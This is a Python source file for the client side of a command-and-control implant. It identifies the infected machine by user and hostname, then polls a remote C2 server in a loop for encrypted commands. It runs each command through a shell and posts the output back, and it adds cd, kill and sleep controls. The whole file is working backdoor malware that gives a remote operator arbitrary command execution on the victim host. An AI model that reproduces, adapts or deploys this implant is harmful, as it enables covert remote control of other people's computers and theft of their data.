#!/bin/python3
"""
C2 Client side code
"""
from os import chdir, getenv, uname, getcwd

import platform, socket, time
from subprocess import PIPE, STDOUT, run
from requests import exceptions, get, post
from crypt import cipher
from settings import PORT, C2_SERVER, CMD_REQUEST, RESPONSE_PATH, CWD_RESPONSE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode


timestamp = str(int(time.time()))
def post_to_server(msg, response_path=RESPONSE_PATH, response_key=RESPONSE_KEY):
    try:
        encrypt_msg = cipher.encrypt(msg).decode()
        post(f"http://{C2_SERVER}:{PORT}{response_path}", data={response_key: encrypt_msg}, headers=HEADER, proxies=PROXY)
    except exceptions.RequestException as e:
        return e

# Check the operating system
if platform.system() == "Windows":
    # Windows environment
    client = getenv("USERNAME", "Unknown_User") + "@" + getenv("COMPUTERNAME", "Unknown_ComputerName") + "_" + timestamp
else:
    # Linux environment
    client = getenv("USER", "Unknown_User") + "@" + uname().nodename + "_" + timestamp
encrypted_client = cipher.encrypt(client.encode()).decode() # encoder

# PROXY = {"https": "proxy.some-site.com:443"}
while True:
    try:
        response = get(f'http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}', headers=HEADER, proxies=PROXY)
        print(response)
        if response.status_code == HTTPStatusCode.NOT_FOUND.value:
            raise exceptions.RequestException
    except exceptions.RequestException as e:
        #print(f"Server down - error: {e}")
        time.sleep(3)
        continue

    cmd = cipher.decrypt(response.content).decode()

    if cmd.startswith("cd "): # cd command
        dir = cmd[3:]
        try:
            chdir(dir)
        except FileNotFoundError:
            post_to_server(f"{dir} was not found.\n")
        except NotADirectoryError:
            post_to_server(f"{dir} is not a directory.\n")
        except PermissionError:
            post_to_server(f"You do not have the permissions to access {dir}.\n")
        except OSError:
            post_to_server(f"There was an OS error on the client.\n")
        else:
            post_to_server(getcwd().encode(), CWD_RESPONSE) # encode of getcwd needed
    elif cmd.startswith('clkl'): # kill command
        post_to_server(f"{client} has been killed.\n")
        exit()

    elif cmd.startswith('clslp '): # sleep command
        try:
            delay = float(cmd.split()[1])
            if delay < 0:
                raise ValueError
        except (IndexError, ValueError):
            print(f"delay is : {delay}")
            post_to_server("You must Enter in a positive nbr for time sleeping in sec.\n")
        else:
            post_to_server(f"{client} will sleep for {delay} seconds.\n")
            time.sleep(delay)
            post_to_server(f"{client} is now awake.\n")

    else:
        cmd_output = run(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
        post_to_server(cmd_output.stdout)

    # cmd_output.stdout is perfect to set back to server.
    #print(cmd_output.stdout.decode())
    print(response.status_code)
    #print(f"Response Object: {response.request.headers}\n\tHeader: {response.headers}\n\tReason: {response.reason}\n\tStatus: {response.status_code}")